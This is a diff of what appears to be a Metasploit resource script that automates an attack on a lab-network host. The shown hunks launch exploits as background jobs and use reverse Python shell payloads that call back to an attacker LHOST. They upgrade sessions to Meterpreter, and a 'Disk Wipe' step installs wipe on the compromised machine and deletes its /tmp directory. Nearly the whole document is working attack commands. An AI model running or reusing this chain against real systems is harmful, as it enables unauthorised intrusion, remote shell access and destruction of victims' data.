@@ -21,7 +21,7 @@ set RHOSTS 192.168.56.181
 set RPORT 8181
 set TARGETURI /
 set SECRET a7aebc287bba0ee4e64f947415a94e5f
-exploit
+exploit -j
 
 # ============================================================
 # STEP 3 - Upgrade Shell to Meterpreter
@@ -40,7 +40,7 @@ set payload cmd/unix/reverse_python
 set SESSION 1
 set VERBOSE True
 set LHOST 192.168.56.191
-exploit
+exploit -j
 
 sessions -k 1,2,3
 
@@ -53,12 +53,13 @@ set payload cmd/unix/reverse_python
 set SESSION 4
 set VERBOSE True
 set LHOST 192.168.56.191
-exploit
+exploit -j
 
 # ============================================================
 # STEP 6 - Disk Wipe
 # ============================================================
 
-sessions -c 'apt install wipe -y' -i
+sessions -i 4 
+apt install wipe -y
 sleep 15
-sessions -c "wipe -f {0}/tmp" -i 
+wipe -rf /tmp
